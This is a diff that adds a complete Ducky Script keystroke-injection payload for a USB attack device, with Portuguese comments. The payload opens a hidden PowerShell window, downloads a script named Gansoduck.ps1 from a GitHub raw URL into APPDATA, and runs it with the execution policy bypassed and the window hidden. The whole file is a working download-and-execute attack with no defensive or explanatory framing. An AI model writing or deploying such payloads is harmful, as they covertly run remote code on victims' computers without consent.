@@ -1,0 +1,19 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+
+REM Define caminho de download
+STRING $dest = "$env:APPDATA\Gansoduck.ps1"
+ENTER
+
+REM Baixa o script do GitHub
+STRING Invoke-WebRequest -Uri "https://github.com/Herna4ndes/Ganso/raw/main/Gansoduck.ps1" -OutFile $dest
+ENTER
+DELAY 3000
+
+REM Executa o script baixado
+STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File $dest
+ENTER
